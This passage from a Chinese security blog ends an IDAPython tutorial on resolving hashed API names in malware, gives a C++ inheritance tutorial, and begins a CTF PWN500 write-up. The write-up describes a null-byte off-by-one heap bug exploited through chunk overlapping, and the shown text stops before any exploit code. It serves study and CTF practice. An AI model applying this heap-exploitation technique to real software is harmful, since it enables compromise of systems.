class="string">&quot;d_&quot;</span>_name))</span><br></pre></td></tr></table></figure>
<p>等这一切都做完后，我们会发现原来很难读懂的汇编代码变得很好理解了。如图所示：<br><img src="/images/idapython/change.png" alt="运行完脚本后的变化"><br>现在，当我们看到DOWRDS列表的时候，就已经能得到真实的函数名字了。并且这些数据能够很好的帮助我们进行静态分析。<br><img src="/images/idapython/after_script.png" alt="脚本运行完的DWORD"><br>完整代码如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">imort json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_enum</span>(<span class="params">constant</span>):</span></span><br><span class="line">    all_enums = GetEnumQty()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, all_enums):</span><br><span class="line">        enum_id = GetnEnum(i)</span><br><span class="line">        enum_constant = GetFirstConst(enum_id, <span class="number">-1</span>)</span><br><span class="line">        name = GetConstName(GetConstEx(enum_id, enum_constant, <span class="number">0</span>, <span class="number">-1</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(enum_constant) == constant: <span class="keyword">return</span> [name, enum_id]</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            enum_constant = GetNextConst(enum_id, enum_constant, <span class="number">-1</span>)</span><br><span class="line">            name = GetConstName(GetConstEx(enum_id, enum_constant, <span class="number">0</span>, <span class="number">-1</span>))</span><br><span class="line">            <span class="keyword">if</span> enum_constant == <span class="number">0xFFFFFFFF</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(enum_constant) == constant: <span class="keyword">return</span> [name, enum_id]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_offset_to_enum</span>(<span class="params">addr</span>):</span></span><br><span class="line">    constant = GetOperandValue(addr, <span class="number">0</span>)</span><br><span class="line">    enum_data = get_enum(constant)</span><br><span class="line">    <span class="keyword">if</span> enum_data:</span><br><span class="line">        name, enum_id = enum_data</span><br><span class="line">        OpEnumEx(addr, <span class="number">0</span>, enum_id, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enum_for_xrefs</span>(<span class="params">load_function_address, json_data, enumeration</span>):</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> XrefsTo(load_function_address, flags=<span class="number">0</span>):</span><br><span class="line">        current_address = x.frm</span><br><span class="line">        addr_minus_20 = current_address<span class="number">-20</span></span><br><span class="line"> </span><br><span class="line">        push_count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> current_address &gt;= addr_minus_20:</span><br><span class="line">            current_address = PrevHead(current_address)</span><br><span class="line">            <span class="keyword">if</span> GetMnem(current_address) == <span class="string">&quot;push&quot;</span>:</span><br><span class="line">                push_count += <span class="number">1</span></span><br><span class="line">                data = GetOperandValue(current_address, <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">if</span> push_count == <span class="number">2</span>:</span><br><span class="line">                    <span class="keyword">if</span> data <span class="keyword">in</span> json_data:</span><br><span class="line">                        name = json_data[data]</span><br><span class="line">                        AddConstEx(enumeration, <span class="built_in">str</span>(name), <span class="built_in">int</span>(data), <span class="number">-1</span>)</span><br><span class="line">                        <span class="keyword">if</span> convert_offset_to_enum(current_address):</span><br><span class="line">                            <span class="built_in">print</span> <span class="string">&quot;[+] Converted 0x%x to %s enumeration&quot;</span> % (current_address, name)</span><br><span class="line">                            address_plus_30 = current_address+<span class="number">30</span></span><br><span class="line">                            address = current_address</span><br><span class="line">                            <span class="keyword">while</span> address &lt;= address_plus_30:</span><br><span class="line">                                address = NextHead(address)</span><br><span class="line">                                <span class="keyword">if</span> GetMnem(address) == <span class="string">&quot;mov&quot;</span>:</span><br><span class="line">                                    <span class="keyword">if</span> <span class="string">&#x27;dword&#x27;</span> <span class="keyword">in</span> GetOpnd(address, <span class="number">0</span>) <span class="keyword">and</span> <span class="string">&#x27;eax&#x27;</span> <span class="keyword">in</span> GetOpnd(address, <span class="number">1</span>):</span><br><span class="line">                                        operand_value = GetOperandValue(address, <span class="number">0</span>)</span><br><span class="line">                                        MakeName(operand_value, <span class="built_in">str</span>(<span class="string">&quot;d_&quot;</span>+name))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">fh = <span class="built_in">open</span>(<span class="string">&quot;output.json&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">d = fh.read()</span><br><span class="line">json_data = json.loads(d)</span><br><span class="line">fh.close()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># JSON objects don&#x27;t allow using integers as dict keys. Little workaround for</span></span><br><span class="line"><span class="comment"># this issue.</span></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> json_data.iteritems():</span><br><span class="line">    json_data[<span class="built_in">int</span>(k)] = json_data.pop(k)</span><br><span class="line"> </span><br><span class="line">conversion_function = <span class="number">0x00405680</span></span><br><span class="line">enumeration = GetEnum(<span class="string">&quot;crc32_functions&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> enumeration == <span class="number">0xFFFFFFFF</span>:</span><br><span class="line">    enumeration = AddEnum(<span class="number">0</span>, <span class="string">&quot;crc32_functions&quot;</span>, idaapi.hexflag())</span><br><span class="line">enum_for_xrefs(conversion_function, json_data, enumeration)</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在上一节中，我们利用IDAPython成功的解决了一个哈希混淆的问题，在这个问题中我们用到了枚举对象。枚举对象对我们分析这类问题会很有帮助，能够节省我们大量的时间。并且这个对象可以很容易的在IDA工程中提取或者加载，这对我们进行批量的逆向分析会很有帮助。<br><strong>reference</strong><br>Part1： <a target="_blank" rel="noopener" href="http://researchcenter.paloaltonetworks.com/2015/12/using-idapython-to-make-your-life-easier-part-1/">http://researchcenter.paloaltonetworks.com/2015/12/using-idapython-to-make-your-life-easier-part-1/</a><br>Part2： <a target="_blank" rel="noopener" href="http://researchcenter.paloaltonetworks.com/2015/12/using-idapython-to-make-your-life-easier-part-2/">http://researchcenter.paloaltonetworks.com/2015/12/using-idapython-to-make-your-life-easier-part-2/</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/26/C-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/10/26/C-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/" class="post-title-link" itemprop="url">C++面向对象程序设计</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-10-26 15:36:56" itemprop="dateCreated datePublished" datetime="2016-10-26T15:36:56+08:00">2016-10-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>类的基本思想是<code>数据抽象</code>和<code>封装</code>。数据抽象是一种依赖于<code>接口</code>和<code>实现</code>分离的编程技术。<br>面向对象程序设计的核心思想是<code>数据抽象</code>、<code>继承</code>和<code>动态绑定</code>。<br><strong>定义基类</strong>  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Quote.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> BULK_QUOTE_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BULK_QUOTE_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Quote</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Quote() = <span class="keyword">default</span>; <span class="comment">// 默认构造函数，目的是既需要其他形式的构造函数，也需要默认的构造函数</span></span><br><span class="line">    Quote(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;book, <span class="keyword">double</span> sales_price):</span><br><span class="line">        bookNo(book), price(sales_price) &#123; &#125;</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">isbn</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getPrice</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">double</span> <span class="title">net_price</span><span class="params">(<span class="keyword">size_t</span> n)</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="keyword">virtual</span> ~Quote() = <span class="keyword">default</span>; <span class="comment">// 对析构函数进行动态绑定</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">string</span> bookNo;</span><br><span class="line">    <span class="keyword">double</span> price = <span class="number">0.0</span>; <span class="comment">// 普通状态不打折的价格</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Quote.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Quote.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">Quote::isbn</span><span class="params">()</span> <span class="keyword">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bookNo;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Quote::getPrice</span><span class="params">()</span> <span class="keyword">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> price;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Quote::net_price</span><span class="params">(<span class="keyword">size_t</span> n)</span> <span class="keyword">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n * getPrice();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在C++语言中基类将它的两种成员函数区分开：一种是基类希望其派生类进行覆盖的函数，另一种是基类希望派生类直接继承而不要改变的函数。对于前者基类通常将其定义为<code>虚函数(virtual)</code>。当我们使用基类的引用或指针调用一个虚函数时，将发生动态绑定，根据引用或绑定的对象类型不同，该调用可能执行基类的版本，也可能执行某个派生类的版本。<br><strong>定义派生类</strong><br>派生类必须通过使用<code>类派生列表(class derivation list)</code>明确指出他是从哪个（哪些）基类继承而来的。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bulk_quote.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Quote.h&quot;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bulk_quote</span> :</span> <span class="keyword">public</span> Quote &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Bulk_quote() = <span class="keyword">default</span>;</span><br><span class="line">    Bulk_quote(<span class="keyword">const</span> <span class="built_in">string</span> &amp;n, <span class="keyword">double</span> p, <span class="keyword">size_t</span> m, <span class="keyword">double</span> d): Quote(n, p), min_qty(m), discount(d) &#123; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">net_price</span><span class="params">(<span class="keyword">size_t</span>)</span> <span class="keyword">const</span> <span class="keyword">override</span></span>; <span class="comment">// 覆盖基类的函数以实现折扣政策</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">size_t</span> min_qty = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">double</span> discount = <span class="number">0.0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>C++11允许派生类显式地注明它将使用哪个成员函数改写基类的虚函数：在该函数的形参列表之后加一个<code>override</code>关键字。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bulk_quote.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Bulk_quote.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Bulk_quote::net_price</span><span class="params">(<span class="keyword">size_t</span> n)</span> <span class="keyword">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; min_qty)</span><br><span class="line">        <span class="keyword">return</span> (n - min_qty) * getPrice() * discount + min_qty * getPrice();</span><br><span class="line">    <span class="keyword">return</span> n * getPrice();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>成员函数通过一个名为<code>this</code>的隐式参数来访问调用它的那个对象。当我们调用一个成员函数时，用请求该函数的对象地址初始化this。<br>net_price()函数参数列表之后的<code>const</code>关键字的作用是修改隐式this指针的类型。默认情况下，this的类型是指向类类型非常量版本的常量指针。例如在Bulk_quote成员函数中，this的类型是<code>Bulk_quote *const</code>。默认情况下我们不能把this绑定到一个常量对象上。这也使得我们不能在一个常量对象上调用普通的成员函数。<br>紧跟在参数列表后面的<code>const</code>表示this是一个指向常量的指针。这样使用const的成员函数称作<code>常量成员函数</code>。常量成员函数不能改变调用它的对象的内容。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Bulk_quote.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Quote.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::ostream;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">print_total</span><span class="params">(ostream &amp;os, <span class="keyword">const</span> Quote &amp;item, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> ret = item.net_price(n);</span><br><span class="line">    os &lt;&lt; <span class="string">&quot;ISBN: &quot;</span> &lt;&lt; item.isbn()</span><br><span class="line">        &lt;&lt; <span class="string">&quot; # sold: &quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot; total due: &quot;</span> &lt;&lt; ret &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Quote <span class="title">basic</span><span class="params">(<span class="string">&quot;241024&quot;</span>, <span class="number">12.5</span>)</span></span>;</span><br><span class="line">    <span class="function">Bulk_quote <span class="title">bulk</span><span class="params">(<span class="string">&quot;241025&quot;</span>, <span class="number">12.5</span>, <span class="number">10</span>, <span class="number">0.8</span>)</span></span>;</span><br><span class="line">    </span><br><span class="line">    print_total(<span class="built_in">cout</span>, basic, <span class="number">20</span>);</span><br><span class="line">    print_total(<span class="built_in">cout</span>, bulk, <span class="number">20</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译  </p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CC = g++</span><br><span class="line">SRC = main.cpp Quote.cpp Bulk_quote.cpp</span><br><span class="line">OBJ = main.o Quote.o Bulk_quote.o</span><br><span class="line">EXEC = main</span><br><span class="line"></span><br><span class="line"><span class="variable">$(EXEC)</span> : <span class="variable">$(OBJ)</span></span><br><span class="line">    <span class="variable">$(CC)</span> -std=c++11 <span class="variable">$(OBJ)</span> -o <span class="variable">$@</span></span><br><span class="line">    rm -f <span class="variable">$(OBJ)</span></span><br><span class="line"><span class="variable">$(OBJ)</span> : Quote.h Bulk_quote.h</span><br><span class="line">    <span class="variable">$(CC)</span> -std=c++11 -c <span class="variable">$(SRC)</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    rm -f main</span><br></pre></td></tr></table></figure>
<p><strong>防止继承的发生</strong><br>C++11新标准提供了一种防止继承发生的方法，即在类名后跟一个关键字final：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoDerived</span> <span class="keyword">final</span> &#123;</span> ... &#125;; <span class="comment">// NoDerived不能作为基类</span></span><br></pre></td></tr></table></figure>
<p><strong>类型转换与继承</strong><br>通常情况下，把引用或指针绑定到一个对象上，则引用或指针的类型应与对象的类型一致。存在继承关系的类是一个重要的例外：可以将基类的引用或指针绑定到派生类对象上。使用基类的引用或指针时，实际上我们并不清楚该引用或指针所绑定类型的真实类型。<br><strong>派生类中的虚函数</strong><br>当我们在派生类中覆盖了某个虚函数时，可以再一次使用virtual关键字指出该函数的性质。然而这么做并非必须，因为一旦某个函数被声明成虚函数，则在所有派生类中它都是虚函数。<br><strong>纯虚函数</strong><br>想要定义一个Disc_quote类来支持不同的折扣策略，Disc_quote负责保存购买量的值和折扣值。其他表示某种特定策略的类将分别继承自Disc_quote，Disc_quote类中的net_price函数显然没有实际含义，因此可以将net_price定义成<code>纯虚(pure virtual)</code>函数。和普通的虚函数不一样，一个纯虚函数无须定义。通过在函数体的位置书写<code>=0</code>就可以将一个虚函数说明为纯虚函数。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Disc_quote.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Quote.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Disc_quote</span> :</span> <span class="keyword">public</span> Quote &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Disc_quote() = <span class="keyword">default</span>;</span><br><span class="line">    Disc_quote(<span class="keyword">const</span> <span class="built_in">string</span> &amp;book, <span class="keyword">double</span> price, <span class="keyword">size_t</span> qty, <span class="keyword">double</span> disc):</span><br><span class="line">        Quote(book, price), quantity(qty), discount(disc) &#123; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">net_price</span><span class="params">(<span class="keyword">size_t</span>)</span> <span class="keyword">const</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">size_t</span> quantity = <span class="number">0</span>; <span class="comment">// 折扣适用的购买量</span></span><br><span class="line">    <span class="keyword">double</span> discount = <span class="number">0.0</span>; <span class="comment">// 折扣</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>我们也可以为纯虚函数提供定义，不过函数体必须定义在类的外部。<br>含有纯虚函数的类是<code>抽象基类(abstract base class)</code>。抽象基类负责定义接口，而后续的其他类可以覆盖该接口。我们不能直接创建一个抽象基类的对象。<br><strong>重新实现Bulk_quote</strong><br>让Bulk_quote继承Disc_quote而非直接继承Quote：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bulk_quote.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Disc_quote.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bulk_quote</span> :</span> <span class="keyword">public</span> Disc_quote &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Bulk_quote() = <span class="keyword">default</span>;</span><br><span class="line">    Bulk_quote(<span class="keyword">const</span> <span class="built_in">string</span> &amp;book, <span class="keyword">double</span> price, <span class="keyword">size_t</span> qty, <span class="keyword">double</span> disc):</span><br><span class="line">        Disc_quote(book, price, qty, disc) &#123; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">net_price</span><span class="params">(<span class="keyword">size_t</span>)</span> <span class="keyword">const</span> <span class="keyword">override</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>Bulk_quote.cpp不需要改变，也不需要实现Disc_quote.cpp文件。<br><strong>reference</strong><br>《C++ Primer 第五版》</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/25/L-CTF2016-PWN500/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/10/25/L-CTF2016-PWN500/" class="post-title-link" itemprop="url">L-CTF2016 PWN500</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-10-25 22:18:47" itemprop="dateCreated datePublished" datetime="2016-10-25T22:18:47+08:00">2016-10-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1eSNtjqE">下载</a><br>漏洞点在new_package的时候会有nullbyte off-by-one，通过伪造prev_size和in_use位来达到chunk overlapping。<br>下图是漏洞点的位置，在new_package函数里。<br><img src="/images/lctfpwn/pwn500.png"><br>图中<code>r12</code>是malloc的堆，用来存放package的结构体，经分析package的结构大体如下：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">package:</span><br><span class="line">| 0x8  | 0x8  | 0x8  | &gt;0x1f0</span><br><span class="line">+------+------+------+-------------+</span><br><span class="line">| next | prev | len  | content     |</span><br><span class="line">+------+------+------+-------------+</span><br></pre></td></tr></table></figure>
<p><code>ebp</code>中存放着要输入的content的length。read_str可以读入length字节的字符，并在后面添加<code>0</code>，添加的0即可构成off-by-one。<br>还有其他一些重要的结构体分析如下：<br>control结构体保存其他结构体的指针或结构体链表的头指针  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">control:</span><br><span class="line">| 0x8         | 0x8         | 0x8</span><br><span class="line">+-------------+-------------+-------------+</span><br><span class="line">| receiver    | sender      | package     |</span><br><span class="line">+-------------+-------------+-------------+</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sender:</span><br><span class="line">| 0x10    | 0x30         | 0x8</span><br><span class="line">+---------+--------------+----------+</span><br><span class="line">| name    | contact      | recv_ptr |</span><br><span class="line">+---------+--------------+----------+</span><br></pre></td></tr></table></figure>

